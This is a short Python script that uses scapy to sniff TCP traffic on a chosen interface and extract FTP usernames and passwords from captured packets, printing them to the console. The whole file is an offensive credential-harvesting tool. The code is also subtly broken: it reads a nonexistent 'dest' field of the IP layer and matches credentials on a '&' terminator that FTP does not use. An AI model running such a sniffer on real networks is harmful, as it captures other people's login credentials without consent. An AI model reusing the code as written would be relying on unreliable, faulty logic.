#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Wed May 16 21:14:46 2018

@author: starboy
"""

import re
import optparse
from scapy.all import *

def find_ftp_login(pkt):
    dest = pkt.getlayer(IP).dest
    raw = pkt.sprintf('%Raw.load%')
    user = re.findall('(?i)USER(.*)&', raw)
    pasw = re.findall('(?i)PASS(.*)&', raw)
	
    if user:
        print ('[+] Found FTP Login to: '+str(dest))
        print('[+]User : '+ str(user[0]))
    elif pasw:
        print ('[+]Password : '+ str(pasw))


# Option parsing
parser = optparse.OptionParser('usage % prog -i <interface>')
parser.add_option('-i', dest='interface', type='string', help='specify interface in monitor mode to listen on') 
(options, args) = parser.parse_args()
if options.interface == None:
	print (parser.usage)
	exit(0)

else:
	conf.iface = options.interface

try: 
	sniff(filter='tcp', prn=find_ftp_login, store=0)
except KeyboardInterrupt:
	exit(0)
except:
    print('Check if interface is in monitor mode')

